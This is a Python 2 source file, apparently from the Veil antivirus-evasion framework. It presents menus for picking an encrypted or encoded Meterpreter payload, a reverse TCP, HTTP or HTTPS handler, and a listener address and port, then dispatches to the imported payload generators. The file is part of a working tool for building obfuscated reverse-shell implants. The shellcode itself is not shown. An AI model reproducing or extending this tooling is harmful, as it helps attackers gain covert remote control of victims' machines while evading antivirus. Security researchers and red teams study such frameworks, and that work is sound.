# Import Modules
import socket
from modules.common import messages
from modules.payloads import python

# PayloadChoice Options
PayloadChoice = {1 : python.pyvoidpointer,
2 : python.pyVirtualAlloc,
3 : python.pyb64VAlloc,
4 : python.pyLetterSubVAlloc,
5 : python.pyARCVAlloc,
6 : python.pyDESVAlloc,
7 : python.pyAESVAlloc
}

# Set/Verify PayloadType Variable
def SetPayloadType():
    global PayloadType
    messages.title()
    print "\n[?] What payload type would you like to use?\n"
    print " 1 - Meterpreter - Python - void pointer"
    print " 2 - Meterpreter - Python - VirtualAlloc()"
    print " 3 - Meterpreter - Python - base64 Encoded"
    print " 4 - Meterpreter - Python - Letter Substitution"
    print " 5 - Meterpreter - Python - ARC4 Stream Cipher"
    print " 6 - Meterpreter - Python - DES Encrypted"
    print " 7 - Meterpreter - Python - AES Encrypted"
    print " 0 - Exit Veil\n"

    # Retrieve PayloadType User Input
    PayloadType = raw_input("[>] Please enter the number of your choice: ")

    # Exit Option
    if PayloadType == "0":
        exit()

    # Check if PayloadType is numeric.
    try:
        float(PayloadType)
    except ValueError:
        return SetPayloadType()

    # Check if PayloadType is a valid option.
    if 0 <= int(PayloadType) <= 7:
        SetHandler()
    else:
        return SetPayloadType()

# Set/Verify Handler Variable
def SetHandler():
    messages.title()
    global Handler
    print '\n[?] What type of payload would you like?\n'
    print ' 1 - Reverse TCP'
    print ' 2 - Reverse HTTP'
    print ' 3 - Reverse HTTPS'
    print ' 0 - Main Menu\n'

    # Retrieve Handler User Input
    Handler = raw_input("[>] Please enter the number of your choice: ")

    # Check if Handler is numeric.
    try:
        float(Handler)
    except ValueError:
        messages.title()
        return SetHandler()

    # Check if Handler is a valid option.
    if Handler == "0":
        SetPayloadType()
    elif 0 <= int(Handler) <= 3:
        SetLocalHost()
    # Payload type validation check.
    else:
        messages.title()
        return SetHandler()

# Set/Verify LocalHost Variable
def SetLocalHost():
    global LocalHost

    # Retrieve LocalHost User Input
    LocalHost = raw_input("[?] What's the Local Host IP Address: ")

    # Temporary Solution for Basic Verification (not perfect, fix later).
    try:
        socket.inet_aton(LocalHost)
        SetLocalPort()
    except socket.error:
        messages.title()
        print
        print "[Error]: Bad IP address specified.\n"
        return SetLocalHost()

# Set/Verify LocalPort Variable
def SetLocalPort():
    global LocalPort

    # Retrieve LocalPort User Input
    LocalPort = raw_input("[?] What's the Local Port Number: ")

    # Check if LocalPort is numeric.
    try:
        float(LocalPort)
    except ValueError:
        messages.title()
        print
        print "[Error]: Bad port number specified.\n"
        return SetLocalPort()

    # Check if LocalPort is a valid port number.
    if 1 <= int(LocalPort) <= 65535:
        PayloadChoice[int(PayloadType)]()
    else:
        messages.title()
        print
        print "[Error]: Bad port number specified.\n"
        return SetLocalPort()
